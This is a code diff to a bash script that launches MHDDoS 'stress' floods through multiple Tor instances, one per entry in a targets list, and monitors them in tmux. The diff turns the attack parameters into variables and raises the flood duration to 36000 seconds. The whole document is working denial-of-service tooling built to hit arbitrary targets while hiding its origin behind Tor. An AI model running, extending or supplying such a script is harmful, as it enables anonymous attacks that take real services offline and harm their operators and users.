@@ -3,7 +3,7 @@
 # Config
 basedir=$(readlink -f $(dirname "$BASH_SOURCE"))
 tor_work_dir="${basedir}/tor"
-#tor_data_dir="${tor_work_dir}/data"
+tor_host="127.0.0.1"
 tor_config_template="templates/torrc"
 targets="${basedir}/targets.txt"
 apt_req=(
@@ -25,6 +25,11 @@ apt_req=(
 )
 mhddos_repo="https://github.com/MHProDev/MHDDoS.git"
 mhddos_dir="${basedir}/mhddos"
+mhddos_socks_type=5
+mhddos_threads=10
+mhddos_rpc=10
+mhddos_duration=36000
+mhddos_debug=true
 tmux_session_name="tor"
 
 # Install system dependencies
@@ -55,7 +60,8 @@ tmux start-server
 tmux kill-session -t ${tmux_session_name}
 tmux new-session -d -s ${tmux_session_name} -n Monitoring "htop"
 tmux set -t ${tmux_session_name} -g pane-border-status top
-tmux set -t ${tmux_session_name} -g pane-border-format "#{pane_index} #{pane_current_command}"
+tmux set -t ${tmux_session_name} -g pane-border-format \
+  "#{pane_index} #{pane_current_command}"
 tmux set -t ${tmux_session_name} mouse
 tmux split-window -t ${tmux_session_name}:0 "nload"
 tmux split-window -t ${tmux_session_name}:0 "/usr/bin/env bash"
@@ -77,7 +83,7 @@ grep -xv '' ${targets} | grep -v '^#' | while read -r target; do
   tor_data_dir_escaped=$(echo ${tor_data_dir} | sed 's/\//\\\//g')
   tor_config="${tor_work_dir}/$i/torrc"
   tor_socks_port=$(expr 9050 + $i)
-  tor_control_port=$(expr 12060 + $i)
+  tor_control_port=$(expr 19060 + $i)
   mhddos_proxy_file="${mhddos_dir}/files/proxies/$i.txt"
 
   # Create tor directories and copy config files
@@ -85,19 +91,24 @@ grep -xv '' ${targets} | grep -v '^#' | while read -r target; do
   cp ${tor_config_template} ${tor_config}
 
   # Prepare tor config file
-  sed -i "s/SOCKS_PORT/${tor_socks_port}/g" ${tor_config} 
-  sed -i "s/DATA_DIR/${tor_data_dir_escaped}/g" ${tor_config} 
-  sed -i "s/CONTROL_PORT/${tor_control_port}/g" ${tor_config} 
+  sed -i "s/HOST/${tor_host}/g" ${tor_config}
+  sed -i "s/SOCKS_PORT/${tor_socks_port}/g" ${tor_config}
+  sed -i "s/DATA_DIR/${tor_data_dir_escaped}/g" ${tor_config}
+  sed -i "s/CONTROL_PORT/${tor_control_port}/g" ${tor_config}
 
   # Start tor and tools
-  tmux new-window -t ${tmux_session_name}:$i -n t "tor -f ${tor_config}"
-  tmux split-window -t ${tmux_session_name}:$i "nyx -i 127.0.0.1:${tor_control_port}"
+  tmux new-window -t ${tmux_session_name}:$i -n "" "tor -f ${tor_config}"
+  tmux split-window -t ${tmux_session_name}:$i \
+    "nyx -i ${tor_host}:${tor_control_port}"
 
   # Create proxy file for mhddos
-  echo "socks5://127.0.0.1:${tor_socks_port}" > ${mhddos_proxy_file}
+  echo "socks5://${tor_host}:${tor_socks_port}" > ${mhddos_proxy_file}
 
   # Start target
-  command="cd ${mhddos_dir} && env/bin/python start.py stress ${target} 5 10 $i.txt 10 3600 true"
+
+  command="cd ${mhddos_dir} && env/bin/python start.py stress ${target} \
+    ${mhddos_socks_type} ${mhddos_threads} $i.txt ${mhddos_rpc} \
+    ${mhddos_duration} ${mhddos_debug}"
   tmux split-window -t ${tmux_session_name}:$i "${command}"
 
   # Set tmux window layout
